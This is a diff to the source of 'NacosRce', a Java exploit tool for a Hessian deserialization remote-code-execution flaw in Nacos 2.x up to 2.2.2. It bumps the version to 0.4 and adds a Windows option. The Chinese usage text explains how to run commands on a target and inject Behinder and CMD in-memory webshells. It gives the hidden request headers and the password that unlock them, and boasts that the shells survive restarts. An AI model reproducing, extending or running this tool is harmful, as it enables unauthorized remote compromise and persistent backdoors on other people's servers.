@@ -39,7 +39,8 @@ public class NacosRce {
         String addr = "";
         String cmd = "";
 
-        if (args.length != 2) {
+        if (args.length != 2 && args.length != 3) {
+
             printUsage();
             if (isDebug){
                 addr = "192.168.90.1:7848";
@@ -52,6 +53,10 @@ public class NacosRce {
         }else {
             addr = args[0];
             cmd = args[1];
+            if (args.length == 3){
+                HessianPayload.os = args[2];
+            }
+
         }
 
         Object hashMap0 = null;
@@ -135,19 +140,21 @@ public class NacosRce {
 
     }
     private static void printUsage() {
-        System.err.println("Nacos Hessian 反序列化漏洞利用工具 v0.3");
+        System.err.println("Nacos Hessian 反序列化漏洞利用工具 v0.4");
         System.err.println("Author: 刨洞安全 && 凉风");
         System.err.println("** 食用方式 **");
-        System.err.println("执行无回显命令\tjava -jar NacosRce.jar ip:port \"[command]\"");
+        System.err.println("执行无回显命令\tjava -jar NacosRce.jar ip:port \"command\" ");
         System.err.println("同时注入冰蝎&&CMD内存马[推荐]\tjava -jar NacosRce.jar ip:port memshell");
+        System.err.println("如果nacos是win的： \tjava -jar NacosRce.jar ip:port memshell windows");
         System.err.println("冰蝎内存马使用方法：\n1、需要设置请求头x-client-data:rebeyond\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、密码rebeyond");
         System.err.println("CMD内存马使用方法：\n1、需要设置请求头x-client-data:cmd\n2、设置Referer:https://www.google.com/\n3、请求头cmd:要执行的命令");
         System.err.println();
-        System.err.println("v0.3版本实现了：");
+        System.err.println("v0.4版本实现了：");
         System.err.println("1、不出网漏洞利用");
         System.err.println("2、可多次发起漏洞利用");
         System.err.println("3、注入冰蝎/CMD内存马");
         System.err.println("4、内存马对多版本进行了兼容");
+        System.err.println("5、修复windows bug");
         System.err.println("tips:\n1、请用jdk1.8\n2、适用于 Nacos 2.x <= 2.2.2\n3、非集群的也能打哦\n4、此内存马重启nacos依然存活");
         System.err.println();
 
